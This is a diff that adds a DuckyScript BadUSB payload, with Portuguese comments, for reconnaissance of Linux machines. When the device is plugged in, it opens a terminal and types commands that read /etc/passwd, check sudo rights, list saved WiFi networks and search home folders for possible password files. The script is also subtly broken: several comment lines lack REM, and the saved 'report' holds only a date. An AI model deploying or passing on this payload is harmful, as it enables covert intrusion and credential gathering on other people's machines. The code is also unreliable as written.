@@ -1,0 +1,48 @@
+REM =================================================================
+REM Ataque BadUSB - Reconhecimento Linux Completo
+REM =================================================================
+REM
+REM Descrição: Script BadUSB para coleta completa de informações do
+REM sistema Linux, incluindo rede, usuários e privilégios.
+REM
+ Quando usar: Para mapear sistemas Linux e identificar pontos de
+REM entrada e privilégios de acesso.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente.
+REM
+ Observações: Requer terminal aberto. Modifique os comandos conforme
+REM necessário para diferentes distribuições.
+REM
+=================================================================
+
+DELAY 1000
+
+Abre terminal
+CTRL ALT t
+DELAY 1000
+
+Coleta informações completas do sistema
+STRING echo "=== RECONHECIMENTO DO SISTEMA ===" && echo
+STRING echo "=== Usuário e Host ===" && whoami && hostname && echo
+STRING echo "=== Interfaces de Rede ===" && ip addr show | grep -E "inet " | grep -v "127.0.0.1" && echo
+STRING echo "=== Usuários com Shell ===" && cat /etc/passwd | grep -E "/bin/bash|/bin/zsh|/bin/sh" && echo
+STRING echo "=== Privilégios Sudo ===" && sudo -l 2>/dev/null && echo
+STRING echo "=== Processos Ativos ===" && ps aux | head -20 && echo
+STRING echo "=== Redes WiFi Salvas ===" && nmcli connection show 2>/dev/null || echo "nmcli não encontrado" && echo
+STRING echo "=== Informações do Kernel ===" && uname -a && echo
+STRING echo "=== Espaço em Disco ===" && df -h && echo
+STRING echo "=== Memória RAM ===" && free -h && echo
+STRING echo "=== Arquivos Recentes ===" && ls -la ~/ | head -10 && echo
+STRING echo "=== Senhas Salvas (se houver) ===" && find /home -name "*.txt" -o -name "*.log" -o -name "*.conf" 2>/dev/null | head -5
+
+ENTER
+
+Salva as informações em arquivo
+STRING echo "Reconhecimento completo em $(date)" > /tmp/recon_report.txt 2>/dev/null || echo "Não foi possível salvar relatório"
+
+ENTER
+
+Fecha o terminal
+STRING exit
+ENTER
